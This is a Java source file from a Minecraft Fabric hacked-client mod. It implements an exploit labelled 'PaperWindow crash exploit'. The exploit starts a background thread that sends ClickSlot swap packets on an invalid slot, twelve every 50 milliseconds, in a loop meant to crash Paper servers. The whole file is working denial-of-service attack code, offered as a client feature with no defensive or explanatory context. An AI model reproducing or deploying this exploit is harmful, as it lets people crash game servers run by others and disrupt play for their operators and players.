package tk.milkthedev.paradiseclientfabric.exploit.impl;

import net.minecraft.client.MinecraftClient;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import tk.milkthedev.paradiseclientfabric.Helper;
import tk.milkthedev.paradiseclientfabric.exploit.Exploit;
import tk.milkthedev.paradiseclientfabric.exploit.ExploitInfo;

@ExploitInfo(
        alias = "paperwindow",
        description = "PaperWindow crash exploit"
)
public class PaperWindowExploit extends Exploit
{
    @Override
    public void execute()
    {
        new Thread(() ->
        {
            Helper.printChatMessage("[CrashExploit] [PaperWindow] Crashing...");
            try
            {
                Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
                itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));

                while (isRunning())
                {
                    for (int i = 0; i < 12; i++)
                    {
                        Helper.sendPacket(new ClickSlotC2SPacket(getMinecraftClient().player.currentScreenHandler.syncId,
                                getMinecraftClient().player.currentScreenHandler.getRevision(),
                                36, -1,
                                SlotActionType.SWAP,
                                getMinecraftClient().player.currentScreenHandler.getCursorStack().copy(),
                                itemMap
                        ));
                    }
                    try {Thread.sleep(50);}
                    catch (InterruptedException e) {Helper.printChatMessage("[CrashExploit] [PaperWindow] Unable to sleep 50ms");}
                }
            }
            catch (NullPointerException ignored) {}

        }).start();
    }
}
